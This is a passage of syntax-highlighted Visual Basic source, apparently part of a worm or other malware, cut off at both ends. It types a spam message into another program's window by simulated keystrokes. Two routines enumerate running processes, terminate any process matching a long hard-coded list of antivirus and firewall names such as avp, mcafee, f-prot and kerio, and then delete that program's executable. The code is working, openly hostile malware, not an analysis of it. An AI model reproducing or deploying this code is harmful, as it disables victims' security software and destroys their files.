</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">ShowWindow</span><span class="sc6">(</span><span class="sc7">iHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc6">)</span><span class="sc0">

    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc7">sr</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_CHAR</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc7">sr</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_KEYDOWN</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VK_CONTROL</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_SYSCHAR</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc4">"s"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_KEYUP</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VK_CONTROL</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0">

</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">AttachThreadInput</span><span class="sc6">(</span><span class="sc7">Whs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SetForegroundWindow</span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">KAVw9x</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Ol</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">pShot</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">PROCESSENTRY32</span><span class="sc0">

</span><span class="sc7">l1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateToolhelp32Snapshot</span><span class="sc6">(</span><span class="sc7">TH32CS_SNAPPROCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">pShot.dwSize</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">pShot</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">l2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Process32First</span><span class="sc6">(</span><span class="sc7">l1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">pShot</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">l2</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">KAV</span><span class="sc6">(</span><span class="sc7">pShot.szexeFile</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

</span><span class="sc7">Ol</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">pShot.th32ProcessID</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TerminateProcess</span><span class="sc6">(</span><span class="sc7">Ol</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc6">(</span><span class="sc7">Ol</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">2000</span><span class="sc0">
</span><span class="sc7">SA</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">pShot.szexeFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">pShot.szexeFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">pShot.szexeFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">pShot.szexeFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">l2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Process32Next</span><span class="sc6">(</span><span class="sc7">l1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">pShot</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">

</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc6">(</span><span class="sc7">l1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">KAVw2k</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">NumElements</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ProcessIDs</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cbNeeded2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Modules</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ModuleName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hPrs</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">

</span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">96</span><span class="sc0">
    </span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc6">&lt;=</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0">
       </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">ReDim</span><span class="sc0"> </span><span class="sc7">ProcessIDs</span><span class="sc6">(</span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc6">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0">
       </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">EnumProcesses</span><span class="sc6">(</span><span class="sc7">ProcessIDs</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Loop</span><span class="sc0">
    
</span><span class="sc7">NumElements</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0"> </span><span class="sc6">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">NumElements</span><span class="sc0">
      
        </span><span class="sc7">hPrs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc6">(</span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ProcessIDs</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">))</span><span class="sc0">
 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">hPrs</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
 </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">EnumProcessModules</span><span class="sc6">(</span><span class="sc7">hPrs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Modules</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cbNeeded2</span><span class="sc6">)</span><span class="sc0">
 </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">EnumProcessModules</span><span class="sc6">(</span><span class="sc7">hPrs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Modules</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">cbNeeded2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cbNeeded2</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
  </span><span class="sc7">ModuleName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">260</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc0">
  </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetModuleFileNameExA</span><span class="sc6">(</span><span class="sc7">hPrs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Modules</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">ModuleName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc7">ModuleName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">ModuleName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc6">)</span><span class="sc0">
   </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">KAV</span><span class="sc6">(</span><span class="sc7">ModuleName</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
   </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TerminateProcess</span><span class="sc6">(</span><span class="sc7">hPrs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
   </span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">2000</span><span class="sc0">
   </span><span class="sc7">SA</span><span class="sc0"> </span><span class="sc7">ModuleName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc7">ModuleName</span><span class="sc0">
   </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
  </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
 </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc6">(</span><span class="sc7">hPrs</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">KAV</span><span class="sc6">(</span><span class="sc7">StrExe</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">kavscan</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"avp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avx"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"adaware"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"advxdwin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"alevir"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"arr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"auto-protect"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Avg"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avw"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ahnsd"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"apvxdwin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"alogserv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avk"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ave32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"anti-trojan"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avsched32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avconsol"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ackwin32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"advxdwin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"autodown"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"alert"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"amon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avmon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"antivir"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"avsynmgr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avnt"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avrep32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ants"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"atcon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"atupdater"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"atwatch"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"autotrace"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"aplica32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"atro55en"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"aupdate"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"autoupdate"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avrescue"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"agent"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avltmain"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"backweb"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"blackice"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"blackd"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"bd_professional"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"bidef"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"bidserver"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"bipcp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"bisp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"bootwarn"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"borg2"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"bs120"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"buscareg"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"clrav"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"claw95ct"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cfiaudit"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cfiadmin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cfgwiz"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cmgrdian"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ctrl"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cleaner"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cfind"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cfinet"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ccapp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"claw95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cpd"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cleanpc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cmon016"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cpf9x206"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cpfnt206"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"csinject"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"csinsm32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"css1631"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cwnb181"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cwntdwmo"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ccevtmgr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ccpxysvc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"dv95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"dvp95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"defwatch"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"defalert"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"doors"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"deputy"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"dpf"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"drwatson"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"drweb32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"drwebupw"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"efinet32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"espwatch"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"esafe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"efpeadm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"etrustcipe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"evpn"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ecengine"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"eli"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"findviru"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"f-agnt95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"frw"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"f-stopw"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"filemon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fprot"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"f-prot"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fch32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fih32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fp-win"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fsgk32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fnrb32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fsaa"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fameh32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fast"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"firewall"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fix-it"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"flowprotector"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fp-win_trial"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"fsav"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fsm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fwenc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"gbmenu"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"gbpoll"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"generics"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"guard"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"hacktracer"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"htlog"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"hwpe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"icssuppnt"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"icload"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"iamapp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"icsupp95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ibma"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"iomon98"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"icmo"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"iface"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"iams"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ifw2000"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"iparmor"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"iris"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"isrv95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"jed"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"jammer"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"kpf"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"kavlite"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"kerio"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"luall"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"lookout"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"lockdown"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"lucomserver"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ldpromenu"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"luspt"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ldnetmon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ldpro"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"localnet"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"lsetup"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"luau"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"luinit"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"luspt"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mpftray"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"moolive"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"msconfig"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mcafee"</span><span class="sc6">,</span><span class="sc0"> 